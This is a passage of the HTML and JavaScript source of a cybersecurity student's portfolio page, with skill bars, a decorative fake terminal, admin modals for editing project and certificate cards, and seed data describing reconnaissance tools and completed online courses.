                <p>I'm always eager to connect with fellow professionals and contribute to innovative security solutions.</p>
            </div>
        </div>
    </section>

    <section id="skills" class="content-section">
        <div class="section-title">
            <h2 id="skills-title"><i class="fas fa-brain"></i> My Skills</h2>
        </div>
        <div id="skills-output">
            <div id="skills-hint" class="click-hint">Click the title above to run skill analysis...</div>
            <div id="skills-animation-content" style="display: none;">
                <div class="command-line"><span class="prompt">mostafa@fortress:~# </span><span id="skills-command"></span><span class="blink-caret"></span></div>
                <div id="skills-content"></div>
            </div>
        </div>
    </section>

    <section id="projects" class="content-section">
        <div class="projects-container">
            <div class="section-title">
                <h2><i class="fas fa-folder-open"></i> Projects</h2>
                <p>A collection of my technical projects, demonstrating my skills in offensive and defensive security, tool development, and secure coding.</p>
            </div>
            <div class="search-filter-container">
                <div class="search-box">
                    <i class="fas fa-search"></i>
                    <input type="text" id="project-search" placeholder="Search projects by name or tech...">
                </div>
            </div>
            <div id="projects-grid" class="cards-grid"></div>
        </div>
    </section>

    <section id="certificates" class="content-section">
        <div class="projects-container">
            <div class="section-title">
                <h2><i class="fas fa-certificate"></i> Certificates</h2>
                <p>My professional certifications, validating my expertise and commitment to the cybersecurity field.</p>
            </div>
            <div class="search-filter-container">
                <div class="search-box">
                    <i class="fas fa-search"></i>
                    <input type="text" id="certificate-search" placeholder="Search certificates by name or skills...">
                </div>
            </div>
            <div id="certificates-grid" class="cards-grid"></div>
        </div>
    </section>

    <section id="blog" class="content-section">
        <div class="projects-container">
            <div class="section-title">
                <h2><i class="fas fa-pen-nib"></i> Learnings & Insights</h2>
                <p>My personal blog where I share insights on recent vulnerabilities, red teaming experiences, and other cybersecurity topics.</p>
            </div>
            <div class="search-filter-container">
                <div class="search-box">
                    <i class="fas fa-search"></i>
                    <input type="text" id="blog-search" placeholder="Search blog posts by title or tags...">
                </div>
            </div>
            <div id="blog-grid" class="cards-grid"></div>
        </div>
    </section>

    <section id="contact" class="content-section">
      <div class="section-title">
        <h2><i class="fas fa-phone-volume"></i> Contact</h2>
      </div>
      <form id="contact-form" style="text-align: center;">
        <input type="text" id="contact-name" placeholder="Your Name" class="glow-input" aria-label="Your Name" required>
        <input type="email" id="contact-email" placeholder="Your Email" class="glow-input" aria-label="Your Email" required>
        <textarea id="contact-message" placeholder="Your Message" class="glow-input" aria-label="Your Message" rows="5" required></textarea>
        <button type="submit" id="contact-submit-btn" class="gradient-button" style="margin: 20px auto 0;">Send Message</button>
        <div id="contact-form-feedback" role="status" aria-live="polite"></div>
      </form>
      <a href="mostafa_galal_cv.pdf" target="_blank" id="download-cv-btn">Download My CV</a>

      <div class="social-icons">
        <a href="https://github.com/Mostafa-Galal-sudo" aria-label="GitHub Profile" target="_blank"><i class="fab fa-github"></i></a>
        <a href="https://www.linkedin.com/in/mostafa-galal-97148b216/" aria-label="LinkedIn Profile" target="_blank"><i class="fab fa-linkedin"></i></a>
        <a href="https://www.facebook.com/mostafa.galal.7545" aria-label="Facebook Profile" target="_blank"><i class="fab fa-facebook"></i></a>
        <a href="https://www.instagram.com/mostafa__galal_11/" aria-label="Instagram Profile" target="_blank"><i class="fab fa-instagram"></i></a>
      </div>
    </section>

    <footer>
      <p>&copy; 2025 My Digital Fortress. All rights reserved.</p>
    </footer>
  </div>
  
  <!-- All modals from original file remain here -->
  <div id="password-modal" class="modal"> <div class="modal-content"> <span class="close" id="password-close">&times;</span> <h2>Admin Access Required</h2> <p>Please enter the administrator password.</p> <input type="password" id="password-input" class="glow-input" placeholder="Password..."> <button id="password-submit" class="gradient-button" style="margin-top: 20px;">Authenticate</button> <p id="password-error">Incorrect password. Access denied.</p> </div> </div>
  <div id="add-card-modal" class="modal"> <div class="modal-content"> <span class="close" id="add-card-close">&times;</span> <h2>Add New Card</h2> <div class="tab-buttons"> <button id="tab-project-btn" class="active">Project</button> <button id="tab-certificate-btn">Certificate</button> <button id="tab-blog-btn">Blog Post</button> </div> <div id="add-project-tab" class="tab-content active"> <section class="add-project"> <h3>Add New Project</h3> <input type="text" id="project-name" placeholder="Project Name" class="glow-input" required> <textarea id="project-description" placeholder="Project Description (short preview)" class="glow-input" required></textarea> <textarea id="project-full-description" placeholder="Full Project Details" class="glow-input" rows="5"></textarea> <input type="text" id="project-challenges" placeholder="Challenges Faced (short)" class="glow-input"> <input type="text" id="project-impact" placeholder="Impact Achieved (short)" class="glow-input"> <input type="text" id="project-takeaways" placeholder="Key Takeaways (short)" class="glow-input"> <input type="text" id="project-image" placeholder="Image URL (optional)" class="glow-input"> <input type="text" id="project-video" placeholder="Video URL (optional)" class="glow-input"> <input type="text" id="project-tech" placeholder="Technologies (comma-separated, e.g., Python, SQL)" class="glow-input"> <input type="text" id="project-github" placeholder="GitHub Link (optional)" class="glow-input"> <input type="text" id="project-demo" placeholder="Live Demo Link (optional)" class="glow-input"> <button id="add-project-btn-modal" class="gradient-button" style="margin-top: 20px;">Add Project</button> </section> </div> <div id="add-certificate-tab" class="tab-content"> <section class="add-certificate"> <h3>Add New Certification</h3> <input type="text" id="certificate-name" placeholder="Certificate Name" class="glow-input" required> <textarea id="certificate-description" placeholder="Certificate Description (short preview)" class="glow-input" required></textarea> <textarea id="certificate-full-description" placeholder="Full Certificate Details" class="glow-input" rows="5"></textarea> <input type="text" id="certificate-impact" placeholder="Impact/Relevance (short)" class="glow-input"> <input type="text" id="certificate-takeaways" placeholder="Key Takeaways (short)" class="glow-input"> <input type="text" id="certificate-image" placeholder="Image URL (optional)" class="glow-input"> <input type="text" id="certificate-verification" placeholder="Verification Link (optional)" class="glow-input"> <input type="text" id="certificate-skills" placeholder="Skills Gained (comma-separated, e.g., Network Security, Incident Response)" class="glow-input"> <button id="add-certificate-btn-modal" class="gradient-button" style="margin-top: 20px;">Add Certification</button> </section> </div> <div id="add-blog-tab" class="tab-content"> <section class="add-blog"> <h3>Add New Blog Post</h3> <input type="text" id="blog-title" placeholder="Blog Post Title" class="glow-input" required> <input type="date" id="blog-date" class="glow-input" required> <textarea id="blog-content" placeholder="Full Blog Post Content" class="glow-input" rows="10" required></textarea> <input type="text" id="blog-tags" placeholder="Tags (comma-separated, e.g., Cybersecurity, Hacking)" class="glow-input"> <button id="add-blog-btn-modal" class="gradient-button" style="margin-top: 20px;">Add Blog Post</button> </section> </div> </div> </div>
  <div id="remove-card-modal" class="modal"> <div class="modal-content"> <span class="close" id="remove-card-close">&times;</span> <h2>Remove Cards</h2> <div class="card-list"> </div> <button id="confirm-remove-btn" class="gradient-button red">Remove Selected</button> </div> </div>
  <div id="detail-modal" class="modal"> <div class="modal-content"> <span class="close" id="detail-modal-close">&times;</span> <h2 id="detail-title"></h2> <div id="detail-media-container"></div> <p id="detail-description"></p> <div id="detail-challenges" class="modal-info-section"></div> <div id="detail-impact" class="modal-info-section"></div> <div id="detail-takeaways" class="modal-info-section"></div> <div id="detail-links" class="modal-links"></div> <div id="detail-skills" class="modal-skills-list"></div> </div> </div>
  <div id="blog-detail-modal" class="modal"> <div class="modal-content"> <span class="close" id="blog-detail-modal-close">&times;</span> <h2 id="blog-detail-title"></h2> <p id="blog-detail-meta" class="blog-detail-meta"></p> <div id="blog-full-content" class="blog-full-content"></div> <div id="blog-detail-tags" class="modal-tags"></div> </div> </div>
  
  <!-- NEW: Edit Card Modal -->
  <div id="edit-card-modal" class="modal">
    <div class="modal-content">
        <span class="close" id="edit-card-close">&times;</span>
        <h2>Edit Card & Reorder</h2>
        <div class="tab-buttons">
            <button id="edit-tab-project-btn" class="active" data-type="project">Projects</button>
            <button id="edit-tab-certificate-btn" data-type="certificate">Certificates</button>
            <button id="edit-tab-blog-btn" data-type="blog">Blog Posts</button>
        </div>
        <div class="editor-container">
            <div id="edit-card-list" class="card-selection-list">
                <!-- Draggable card list will be populated here -->
            </div>
            <div id="card-editor-form" class="card-editor-form">
                <div class="form-and-preview">
                    <div class="form-fields">
                        <input type="hidden" id="edit-card-type">
                        <input type="hidden" id="edit-card-original-index">
                        
                        <label for="edit-card-name">Title/Name</label>
                        <input type="text" id="edit-card-name" class="glow-input">
                        
                        <label for="edit-card-description">Short Description</label>
                        <textarea id="edit-card-description" class="glow-input" rows="3"></textarea>
                        
                        <label for="edit-card-full-description">Full Description/Content</label>
                        <textarea id="edit-card-full-description" class="glow-input" rows="6"></textarea>
                        
                        <label for="edit-card-image">Image URL</label>
                        <div class="image-upload-container">
                            <input type="text" id="edit-card-image" class="glow-input" style="flex-grow: 1;">
                            <label for="edit-card-image-upload" class="file-label">Upload</label>
                            <input type="file" id="edit-card-image-upload" accept="image/*">
                        </div>

                        <label for="edit-card-tech">Technologies/Tags (comma-separated)</label>
                        <input type="text" id="edit-card-tech" class="glow-input">
                        
                        <div id="project-links-container">
                            <label for="edit-card-github">GitHub Link</label>
                            <input type="text" id="edit-card-github" class="glow-input">
                            <label for="edit-card-demo">Demo Link</label>
                            <input type="text" id="edit-card-demo" class="glow-input">
                        </div>
                        <div id="certificate-links-container">
                            <label for="edit-card-verification">Verification Link</label>
                            <input type="text" id="edit-card-verification" class="glow-input">
                        </div>
                        
                        <div class="editor-actions">
                            <button id="save-card-changes-btn" class="gradient-button">Save Changes</button>
                            <button id="undo-card-changes-btn" class="gradient-button red" disabled>Undo</button>
                        </div>
                    </div>
                    <div id="live-preview-container">
                        <h3>Live Preview</h3>
                        <!-- Live preview card will be injected here -->
                    </div>
                </div>
            </div>
        </div>
    </div>
  </div>

  <div id="mini-terminal">
      <div id="terminal-header">mostafa@fortress:~</div>
      <div id="terminal-output"></div>
      <div id="terminal-input-container">
          <span id="terminal-prompt">></span>
          <input type="text" id="terminal-input">
      </div>
  </div>

  <script>
    // --- Utility Functions ---
    const playBeep = () => {
      const beepSound = document.getElementById('beep-sound');
      if (beepSound) {
        beepSound.currentTime = 0; // Rewind to start
        beepSound.play().catch(e => console.error("Audio playback failed:", e));
      }
    };

    // --- Preloader & Initial Setup ---
    const preloader = document.getElementById('preloader');
    window.addEventListener('load', () => {
        preloader.style.opacity = '0';
        setTimeout(() => {
            preloader.style.display = 'none';
            typeLoginIntroMessages(); 
        }, 500); 
    });

    // --- 3D Background Scene with Three.js ---
    let scene, camera, renderer, dataObject, particles, particles2;

    function initThreeJS() {
        const bgContainer = document.getElementById('three-bg');
        
        scene = new THREE.Scene();
        camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
        camera.position.z = 5;

        renderer = new THREE.WebGLRenderer({ alpha: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
        bgContainer.appendChild(renderer.domElement);

        // --- Data Object (Icosahedron) ---
        const material = new THREE.MeshBasicMaterial({ 
            color: 0x00ffff,
            wireframe: true,
            transparent: true,
            opacity: 0.5
        });
        const geometry = new THREE.IcosahedronGeometry(1.5, 0);
        dataObject = new THREE.Mesh(geometry, material);
        scene.add(dataObject);

        // --- Particle System 1 (Cyan) ---
        const particleCount = 5000;
        const particleGeometry = new THREE.BufferGeometry();
        const positions = new Float32Array(particleCount * 3);
        for (let i = 0; i < particleCount * 3; i++) {
            positions[i] = (Math.random() - 0.5) * 20;
        }
        particleGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
        const particleMaterial = new THREE.PointsMaterial({
            color: 0x00ffff,
            size: 0.02,
            transparent: true,
            opacity: 0.6
        });
        particles = new THREE.Points(particleGeometry, particleMaterial);
        scene.add(particles);

        // --- Particle System 2 (Magenta) ---
        const particleGeometry2 = new THREE.BufferGeometry();
        const positions2 = new Float32Array(particleCount * 3);
        for (let i = 0; i < particleCount * 3; i++) {
            positions2[i] = (Math.random() - 0.5) * 25;
        }
        particleGeometry2.setAttribute('position', new THREE.BufferAttribute(positions2, 3));
        const particleMaterial2 = new THREE.PointsMaterial({
            color: 0xff00ff,
            size: 0.025,
            transparent: true,
            opacity: 0.4
        });
        particles2 = new THREE.Points(particleGeometry2, particleMaterial2);
        scene.add(particles2);

        window.addEventListener('resize', onWindowResize, false);
        animate();
    }

    function onWindowResize() {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
    }
    
    let mouseX = 0, mouseY = 0;
    document.addEventListener('mousemove', (event) => {
        mouseX = (event.clientX / window.innerWidth) * 2 - 1;
        mouseY = -(event.clientY / window.innerHeight) * 2 + 1;
    });

    function animate() {
        requestAnimationFrame(animate);

        dataObject.rotation.x += 0.001;
        dataObject.rotation.y += 0.002;
        particles.rotation.y += 0.0005;
        particles2.rotation.y -= 0.0007;

        camera.position.x += (mouseX * 0.1 - camera.position.x) * 0.02;
        camera.position.y += (mouseY * 0.1 - camera.position.y) * 0.02;
        camera.lookAt(scene.position);

        renderer.render(scene, camera);
    }

    // --- Automated Login Screen Logic ---
    const loginScreen = document.getElementById('login-screen');
    const mainContent = document.getElementById('main-content');
    const loginInitialMessage = document.getElementById('login-initial-message');

    const loginIntroMessages = [
      "> Initializing system...",
      "> Establishing secure connection...",
      "> Authenticating user credentials...",
      "> Access Granted. Welcome," 
    ];

    function typeLoginIntroMessages(index = 0) {
      if (index < loginIntroMessages.length) {
        loginInitialMessage.textContent = ''; 
        let charIndex = 0;
        const currentMessage = loginIntroMessages[index];
        const typingInterval = setInterval(() => {
          if (charIndex < currentMessage.length) {
            loginInitialMessage.textContent += currentMessage.charAt(charIndex);
            charIndex++;
          } else {
            clearInterval(typingInterval);
            if (index === loginIntroMessages.length - 1) {
              playBeep(); 
              setTimeout(() => {
                loginScreen.style.opacity = '0'; 
                setTimeout(() => {
                    loginScreen.style.display = "none";
                    mainContent.style.display = "block";
                    initThreeJS();
                    typeHeroTerminalText(); 
                    initMiniTerminal(); 
                    initScrollAnimations();
                }, 500); 
              }, 1500); 
            } else {
              setTimeout(() => typeLoginIntroMessages(index + 1), 1000); 
            }
          }
        }, 50); 
      }
    }

    // --- Hero Section Terminal Text Typing Script ---
    const heroTerminalTextElement = document.getElementById('terminal-text');
    const heroTextContent = "> Accessing mainframe...\n> Decrypting security protocols...\n> Welcome, USER. Your secure session is active.";

    function typeHeroTerminalText() {
        let i = 0;
        heroTerminalTextElement.textContent = '';
        function typing() {
            if (i < heroTextContent.length) {
                heroTerminalTextElement.textContent += heroTextContent.charAt(i);
                i++;
                setTimeout(typing, 50);
            }
        }
        typing();
    }

    // --- Skills Section Logic (Dynamic Proficiency Display) ---
    const skillsTitle = document.getElementById('skills-title');
    const skillsOutput = document.getElementById('skills-output');
    const skillsHint = document.getElementById('skills-hint');
    const skillsAnimationContent = document.getElementById('skills-animation-content');
    const skillsCommandElement = document.getElementById('skills-command');
    const skillsContentElement = document.getElementById('skills-content');
    const skillsCommand = "ls -la /usr/bin/security_skills"; 
    let skillsAnimated = false;

    const allSkillsData = [
        { category: "Offensive Security", skills: [
            {name: "Pen Testing", proficiency: 90},
            {name: "Exploit Dev", proficiency: 75},
            {name: "Red Teaming", proficiency: 85},
            {name: "Soc. Eng.", proficiency: 80}
        ]},
        { category: "Defensive Security", skills: [
            {name: "Sec. Arch.", proficiency: 88},
            {name: "SIEM/SOAR", proficiency: 92},
            {name: "Incident Resp.", proficiency: 87},
            {name: "Vuln. Mgmt.", proficiency: 90}
        ]},
        { category: "Cloud Security", skills: [
            {name: "AWS Security", proficiency: 82},
            {name: "Azure Security", proficiency: 78},
            {name: "Cloud Forensics", proficiency: 70}
        ]},
        { category: "Programming", skills: [
            {name: "Python", proficiency: 95},
            {name: "Bash/Shell", proficiency: 88},
            {name: "C/C++", proficiency: 65},
            {name: "PowerShell", proficiency: 70}
        ]},
        { category: "Tools & Frameworks", skills: [
            {name: "Metasploit", proficiency: 90},
            {name: "Nmap", proficiency: 95},
            {name: "Burp Suite", proficiency: 85},
            {name: "Wireshark", proficiency: 80},
            {name: "Kali Linux", proficiency: 98}
        ]}
    ];
    
    skillsTitle.addEventListener('click', () => {
        if (!skillsAnimated) {
            skillsHint.style.display = 'none';
            skillsAnimationContent.style.display = 'block';
            typeSkillsCommand();
            skillsAnimated = true;
        }
    });

    function typeSkillsCommand() {
        let i = 0;
        skillsCommandElement.textContent = '';
        skillsContentElement.innerHTML = ''; 
        function typeChar() {
            if (i < skillsCommand.length) {
                skillsCommandElement.textContent += skillsCommand.charAt(i);
                i++;
                setTimeout(typeChar, 70); 
            } else {
                setTimeout(displaySkillsProficiency, 1000); 
            }
        }
        typeChar();
    }

    
    function displayProficiencyBars() {
        skillsContentElement.innerHTML = ''; 
        allSkillsData.forEach(cat => {
            const categoryDiv = document.createElement('div');
            categoryDiv.className = 'skill-category';
            
            categoryDiv.innerHTML = `<h4>Executing ./<span style="color:var(--primary-cyan);">${cat.category.replace(/ /g, '_')}.sh</span>...</h4>`;

            cat.skills.forEach(skill => {
                const skillItem = document.createElement('div');
                skillItem.className = 'skill-item';
                skillItem.innerHTML = `
                    <span class="skill-name">${skill.name}</span>
                    <div class="proficiency-bar-container">
                        <div class="proficiency-bar" style="width: 0%;"></div>
                    </div>
                `;
                categoryDiv.appendChild(skillItem);
            });
            skillsContentElement.appendChild(categoryDiv);
        });

        
        setTimeout(() => {
            document.querySelectorAll('.proficiency-bar').forEach((barElement, index) => {
                let currentSkillProficiency = 0;
                let found = false;
                let flatIndex = 0;
                for (const cat of allSkillsData) {
                    for (const skill of cat.skills) {
                        if (flatIndex === index) {
                            currentSkillProficiency = skill.proficiency;
                            found = true;
                            break;
                        }
                        flatIndex++;
                    }
                    if (found) break;
                }
                barElement.style.width = `${currentSkillProficiency}%`;
            });
        }, 100);
    }

    
    function displaySkillsProficiency() {
        skillsContentElement.innerHTML = ''; 
        const outputContainer = document.createElement('pre');
        skillsContentElement.appendChild(outputContainer);

        const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
        let totalSize = 0;

        const fileData = allSkillsData.map(cat => {
            const size = Math.floor(Math.random() * 3000) + 500;
            totalSize += size;
            const month = months[Math.floor(Math.random() * 12)];
            const day = Math.floor(Math.random() * 28) + 1;
            const hour = String(Math.floor(Math.random() * 12)).padStart(2, '0');
            const minute = String(Math.floor(Math.random() * 60)).padStart(2, '0');
            return {
                permissions: '-rwxr-xr--',
                owner: 'root',
                group: 'root',
                size: String(size).padStart(5, ' '),
                date: `${month} ${String(day).padStart(2, ' ')} ${hour}:${minute}`,
                name: `${cat.category.replace(/ /g, '_')}.sh`
            };
        });

        const lines = [`total ${Math.ceil(totalSize / 1024)}`];
        fileData.forEach(file => {
            lines.push(`${file.permissions} 1 ${file.owner} ${file.group} ${file.size} ${file.date} <span style="color:var(--primary-cyan);">${file.name}</span>`);
        });

        let lineIndex = 0;
        function printLineByLine() {
            if (lineIndex < lines.length) {
                outputContainer.innerHTML += lines[lineIndex] + '\n';
                playBeep();
                lineIndex++;
                setTimeout(printLineByLine, 150); 
            } else {
                
                setTimeout(displayProficiencyBars, 1000); 
            }
        }

        printLineByLine();
    }


    // --- Admin & Card Modal Scripts ---
    const addCardBtn = document.getElementById('add-card-btn');
    const editCardBtn = document.getElementById('edit-card-btn'); // New button
    const removeCardBtn = document.getElementById('remove-card-btn');
    const passwordModal = document.getElementById('password-modal');
    const passwordInput = document.getElementById('password-input');
    const passwordSubmit = document.getElementById('password-submit');
    const passwordClose = document.getElementById('password-close');
    const passwordError = document.getElementById('password-error');
    
    const addCardModal = document.getElementById('add-card-modal');
    const addCardCloseBtn = document.getElementById('add-card-close');
    const tabProjectBtn = document.getElementById('tab-project-btn');
    const tabCertificateBtn = document.getElementById('tab-certificate-btn');
    const tabBlogBtn = document.getElementById('tab-blog-btn');
    const addProjectTab = document.getElementById('add-project-tab');
    const addCertificateTab = document.getElementById('add-certificate-tab');
    const addBlogTab = document.getElementById('add-blog-tab');
    const addProjectBtnModal = document.getElementById('add-project-btn-modal');
    const addCertificateBtnModal = document.getElementById('add-certificate-btn-modal');
    const addBlogBtnModal = document.getElementById('add-blog-btn-modal');
    const projectsContainer = document.getElementById('projects-grid');
    const certificatesContainer = document.getElementById('certificates-grid');
    const blogContainer = document.getElementById('blog-grid');

    const removeCardModal = document.getElementById('remove-card-modal');
    const removeCardCloseBtn = document.getElementById('remove-card-close');
    const confirmRemoveBtn = document.getElementById('confirm-remove-btn');
    const cardList = document.querySelector('#remove-card-modal .card-list');

    // NEW: Edit Card Modal elements
    const editCardModal = document.getElementById('edit-card-modal');
    const editCardCloseBtn = document.getElementById('edit-card-close');
    const editCardList = document.getElementById('edit-card-list');
    const cardEditorForm = document.getElementById('card-editor-form');
    let currentEditSnapshot = null; // For undo functionality

    // Detail Modal elements (Project/Certificate)
    const detailModal = document.getElementById('detail-modal');
    const detailModalCloseBtn = document.getElementById('detail-modal-close');
    const detailTitle = document.getElementById('detail-title');
    const detailMediaContainer = document.getElementById('detail-media-container');
    const detailDescription = document.getElementById('detail-description');
    const detailChallenges = document.getElementById('detail-challenges');
    const detailImpact = document.getElementById('detail-impact');
    const detailTakeaways = document.getElementById('detail-takeaways');
    const detailLinks = document.getElementById('detail-links');
    const detailSkills = document.getElementById('detail-skills');

    // Blog Detail Modal elements
    const blogDetailModal = document.getElementById('blog-detail-modal');
    const blogDetailModalCloseBtn = document.getElementById('blog-detail-modal-close');
    const blogDetailTitle = document.getElementById('blog-detail-title');
    const blogDetailMeta = document.getElementById('blog-detail-meta');
    const blogFullContent = document.getElementById('blog-full-content');
    const blogDetailTags = document.getElementById('blog-detail-tags');

    // Arrays to store data, initialized from localStorage
let projectsArray = JSON.parse(localStorage.getItem('projectsArray')) || [
    {
        name: "OmniRecon Pro",
        date: "",
        description: "A Bash-based network intelligence platform for bug bounty hunters, automating subdomain, directory, and parameter discovery with proxy rotation and integrated tools.",
        full_description: "OmniRecon Pro is a comprehensive Bash-based network intelligence platform ... (truncated for brevity)",
        key_takeaways: "Developed a multi-functional reconnaissance tool, demonstrating strong scripting, tool integration, and automation skills crucial for efficient bug bounty hunting and penetration testing.",
        tech: "Bash, Nmap, Anubis, Subfinder, httpx, xargs, set -euo pipefail",
        image: "https://placehold.co/400x300/020412/00ffff?text=OmniRecon+Pro",
        github: "",
        demo: ""
    },
    {
        name: "Dominion Tool",
        date: "",
        description: "A custom cybersecurity tool for automated subdomain enumeration and vulnerability scanning, complementing OmniRecon with deep reconnaissance capabilities.",
        full_description: "Dominion is a custom cybersecurity tool I developed for automated subdomain enumeration ...",
        key_takeaways: "Designed and conceptualized a comprehensive reconnaissance and scanning tool, showcasing an understanding of vulnerability lifecycle management and automated security workflows.",
        tech: "Bash (inferred), Subfinder, Amass, Nuclei, xargs -P, set -euo pipefail",
        image: "https://placehold.co/400x300/020412/00ffff?text=Dominion+Tool",
        github: "",
        demo: ""
    },
    {
        name: "Automated Vulnerability Scanner",
        date: "2025-04-22",
        description: "Python tool automating web app vulnerability scanning (XSS, SQLi, CSRF).",
        full_description: "Designed and implemented a modular Python-based vulnerability scanner for web applications. The scanner integrates with SQLMap for SQL Injection detection and has custom modules for Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) vulnerability identification. It includes reporting features.",
        challenges_faced: "Handling diverse web application responses and avoiding false positives was challenging.",
        impact_achieved: "Streamlined the initial phase of web penetration testing, reducing manual effort by 40%.",
        key_takeaways: "Learned about automating web exploitation and designing robust detection logic.",
        image: "https://placehold.co/400x300/020412/00ffff?text=Vuln+Scanner+UI",
        video: "",
        tech: "Python, Flask, SQLMap, Nmap",
        github: "",
        demo: ""
    },
    {
        name: "Bruteforce Script Tool",
        date: "",
        description: "A Python-based bruteforce script for authentication testing, featuring proxy rotation and parallel execution to identify weak credentials.",
        full_description: "I developed a Python-based bruteforce script specifically for testing authentication endpoints ...",
        key_takeaways: "Built an effective authentication testing tool, demonstrating proficiency in Python scripting, HTTP requests, parallel processing, and robust error handling for ethical hacking.",
        tech: "Python, Bash, requests, termcolor, xargs -P, set -euo pipefail",
        image: "https://placehold.co/400x300/020412/00ffff?text=Bruteforce+Tool",
        github: "",
        demo: ""
    }
];
    let certificatesArray = JSON.parse(localStorage.getItem('certificatesArray')) || [
    {
        "name": "Cybersecurity For Beginners",
        "date": "2025-07-02",
        "description": "A beginner-level cybersecurity course from Mahara-Tech covering 8 foundational topics.",
        "full_description": "Mostafa Galal completed the 'Cybersecurity For Beginners' course from Mahara-Tech on July 2, 2025. The course, totaling 35 hours across 8 modules, was delivered in collaboration with VMware and the Ministry of Communications and Information Technology. It provided foundational knowledge in network security, cyber threats, and best practices for securing digital infrastructure.",
        "key_takeaways": "Built a solid cybersecurity foundation across 8 modules, emphasizing real-world concepts and risk awareness.",
        "image": "cyber.png",
        "verification": "https://maharatech.gov.eg/certificates/KJCFdlaQhL",
        "skills": "Cybersecurity, Network Security, VMware"
    },
    {
        "name": "Ethical Hacking",
        "date": "2025-07-01",
        "description": "Completed the Ethical Hacking course from Mahara-Tech covering offensive security basics.",
        "full_description": "Mostafa Galal successfully completed the 'Ethical Hacking' course on July 1, 2025, through the Mahara-Tech platform. This 3.5-hour course introduced core ethical hacking techniques including reconnaissance, exploitation, and post-exploitation tactics relevant to modern security engagements.",
        "key_takeaways": "Gained practical insight into ethical hacking methods used in real-world offensive security.",
        "image": "ethical.png",
        "verification": "https://maharatech.gov.eg/certificates/smrm8pfpIF",
        "skills": "Ethical Hacking, Cybersecurity, Penetration Testing"
    },
    {
        "name": "Red Hat System Administration I",
        "date": "2025-07-02",
        "description": "Red Hat Linux administration training through Mahara-Tech with a hands-on approach.",
        "full_description": "Completed the 'Red Hat System Administration I' course on July 2, 2025, offered by Mahara-Tech. This 9-hour course focused on essential Linux skills such as user management, file permissions, network configuration, and system diagnostics, all aligned with Red Hat's RHCSA learning objectives.",
        "key_takeaways": "Strengthened core system administration skills using Red Hat Linux, enhancing readiness for enterprise environments.",
        "image": "redhat.png",
        "verification": "https://maharatech.gov.eg/certificates/SmqfO4ljdQ",
        "skills": "Linux, Red Hat, System Administration"
    },
        
        {
            "name": "EF SET English Certificate",
            "date": "2024-12-03",
            "description": "An English proficiency certificate indicating a C2 Proficient level.",
            "full_description": "Mostafa Galal successfully completed the EF SET Certificate, achieving a score of 72/100, which corresponds to a C2 Proficient level according to the CEFR. The certificate was awarded on December 3, 2024, with individual scores of 71 for Reading and 73 for Listening.",
            "key_takeaways": "Verified high-level English language proficiency.",
            "image": "efset.jpeg",
            "verification": "https://cert.efset.org/z4h2va",
            "skills": "English Language, Reading Comprehension, Listening Comprehension, Communication"
        },
        {
            "name": "Complete Ethical Hacking Course 2025 : Go From Zero to Hero",
            "date": "2025-01-23",
            "description": "A comprehensive Udemy course on ethical hacking, covering concepts from beginner to advanced.",
            "full_description": "This Udemy certificate indicates that Mostafa Galal completed the 'Complete Ethical Hacking Course 2025 : Go From Zero to Hero.' The instructor was Ramsai Dupati. The course was completed on January 23, 2025, and had a total length of 5.5 hours.",
            "key_takeaways": "Extensive knowledge and practical skills in ethical hacking from beginner to advanced levels.",
            "image": "completeethicalhackingzerotohero.jpeg",
            "verification": "https://ude.my/UC-b2b6dc6d-0376-4f98-9f4a-9fdffb4cf252",
            "skills": "Ethical Hacking, Penetration Testing, Cybersecurity, Network Security, Web Application Security, Kali Linux"
        },
        {
            "name": "Linux Command Line: From Zero to Hero",
            "date": "2025-02-12",
            "description": "A Udemy course guiding learners from basic to advanced Linux command-line proficiency.",
            "full_description": "Mostafa Galal completed the 'Linux Command Line: From Zero to Hero' course on Udemy. The instructor was Pragmatic Programmer. The course was completed on February 12, 2025, and had a total length of 6 hours.",
            "key_takeaways": "Comprehensive mastery of Linux command-line operations.",
            "image": "linuxxommandline.png",
            "verification": "https://ude.my/UC-809e762c-9394-4c4c-860c-6dcefedaf5f7",
            "skills": "Linux Command Line, Shell Scripting, File System Navigation, Process Management, Permissions, Linux Administration"
        },
        {
            "name": "Complete Linux Training Course to Get Your Ideal IT Job",
            "date": "2025-02-13",
            "description": "A training course focused on preparing for an IT job using Linux.",
            "full_description": "This Udemy certificate confirms that Mostafa Galal completed the 'Complete Linux Training Course to Get Your Ideal IT Job.' The instructor was Mina Magdy. The course was completed on February 13, 2025, and had a total length of 4 hours.",
            "key_takeaways": "Practical Linux skills essential for IT job roles.",
            "image": "linuxtraining.png",
            "verification": "https://ude.my/UC-94c234fe-2142-43cb-9a9f-b899e9d5f4e",
            "skills": "Linux, Command Line, System Administration, IT Operations, Shell Scripting, Troubleshooting"
        },
        {
            "name": "Mastering Linux: The Complete Guide to Becoming a Linux Pro",
            "date": "2025-02-19",
            "description": "A complete guide on Udemy to become a Linux professional.",
            "full_description": "This Udemy certificate indicates that Mostafa Galal completed 'Mastering Linux: The Complete Guide to Becoming a Linux Pro.' The instructor was OCSALY Academy. The course was completed on February 19, 2025, and had a total length of 5 hours.",
            "key_takeaways": "Advanced skills and knowledge to operate as a Linux professional.",
            "image": "masteringlinux.png",
            "verification": "https://ude.my/UC-a7f568ad-84c5-408a-bb2e-953df1c2f7a5d",
            "skills": "Linux Administration, Advanced Linux Commands, System Configuration, Networking in Linux, Security in Linux, Troubleshooting"
        },
        {
            "name": "40 Days to Python Success: Master Python Programming",
            "date": "2025-02-27",
            "description": "A Udemy course designed to achieve mastery in Python programming within 40 days.",
            "full_description": "Mostafa Galal completed the '40 Days to Python Success: Master Python Programming' course on Udemy. The instructors were Dr Python, Mr Khan, and Faisal Zamir. The course was completed on February 27, 2025, and had a total length of 4.5 hours.",
            "key_takeaways": "Accelerated learning and mastery of Python programming.",
            "image": "40daystomasterpython.png",
            "verification": "https://ude.my/UC-e88476e5-48e3-4259-8297-f44e6abdb1d5",
            "skills": "Python Programming, Scripting, Data Structures, OOP, Problem Solving"
        },
        {
            "name": "Foundations of Networking with Cisco",
            "date": "2025-03-03",
